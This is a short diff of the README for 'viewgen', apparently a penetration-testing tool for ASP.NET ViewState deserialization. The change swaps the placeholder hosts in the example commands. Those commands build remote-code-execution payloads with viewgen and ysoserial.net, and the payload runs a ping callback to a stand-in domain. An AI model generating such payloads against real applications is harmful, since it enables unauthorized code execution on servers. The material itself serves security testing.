@@ -85,7 +85,7 @@ Leaking the `web.config` file or validation keys from ASP.NET apps results in RC
 You can use the built-in `command` option to generate a payload:
 
 ```bash
-$ viewgen --webconfig web.config -m CA0B0334 -c "ping pwning.re"
+$ viewgen --webconfig web.config -m CA0B0334 -c "ping yourdomain.tld"
 ```
 
 However, you can also generate it manually:
@@ -93,7 +93,7 @@ However, you can also generate it manually:
 **1 -** Generate a payload with [ysoserial.net](https://github.com/pwntester/ysoserial.net):
 
 ```bash
-> ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "ping x.x.x.x"
+> ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "ping yourdomain.tld"
 ```
 
 **2 -** Grab a modifier (`__VIEWSTATEGENERATOR` value) from a given endpoint of the webapp
